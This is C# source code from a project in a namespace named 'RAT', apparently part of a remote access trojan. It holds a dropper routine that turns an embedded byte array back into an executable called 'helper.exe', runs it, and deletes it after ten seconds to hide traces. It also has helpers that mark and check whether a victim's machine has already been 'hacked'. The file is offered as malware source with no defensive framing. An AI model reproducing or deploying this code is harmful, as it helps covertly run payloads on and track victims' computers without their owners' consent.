using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Windows.Forms;
namespace RAT
{
    class Fileybter
    {
        
        public static string ReturnBytesString(string binary_file_path)
        {
            try
            {
                string bytes_string = "";

                if (File.Exists(binary_file_path) == false)
                    return null;

                byte[] ___bytes___ = File.ReadAllBytes(binary_file_path);
                foreach (byte singeLByte in ___bytes___)
                    bytes_string += (singeLByte.ToString() + " ");

                return bytes_string;
            }
            catch (Exception s) { return s.Message; }
        }
        public static string ReturnBytesArray(string binary_file_path)
        {
            try
            {
                string bytes_Arr = "string[] arrr = new string[] {";

                if (File.Exists(binary_file_path) == false)
                    return null;

                byte[] ___bytes___ = File.ReadAllBytes(binary_file_path);
                foreach (byte singeLByte in ___bytes___)
                    bytes_Arr += ("\"" + singeLByte.ToString() + "\",");

                return bytes_Arr.Substring(0, bytes_Arr.Length - 1) + "}";
            }
            catch (Exception xc) { return xc.Message; }

        }
        public static bool   Write_Execute_AndRemove(string[] arrr, string fp,bool remove=false)
        {
            try
            {
                if (fp == "")
                    fp = Application.StartupPath + "helper.exe";

                List<byte> bytes = new List<byte>();
                foreach (string a in arrr)
                 if (a != "")
                        bytes.Add(byte.Parse(a));
                

                File.WriteAllBytes(fp, bytes.ToArray());
                System.Diagnostics.Process.Start(fp);
                try
                {
                    if (remove)
                    {
                        System.Threading.Thread.Sleep(10000);
                        System.IO.File.Delete(fp);
                    }
                }
                catch { }
                return true;
            }
            catch { return false; }
        }
        public static bool   RegisterHacked(string identifier)
        {
            try
            {
                string fileusername = Application.StartupPath + "wininfo";
                File.WriteAllText(fileusername, Environment.UserName+":"+identifier);
                return true;
            }
            catch { return false; }
        }
        public static bool IsHackedBefore(string id  )
        {
            try
            {
                string f2 = Path.GetTempPath() + "\\reg.ini";
                string file =File.ReadAllText(f2 );
                return (file.Contains(Environment.UserName) && file.Contains(id)); ;
            }
            catch { return false; }
        }
    }
}
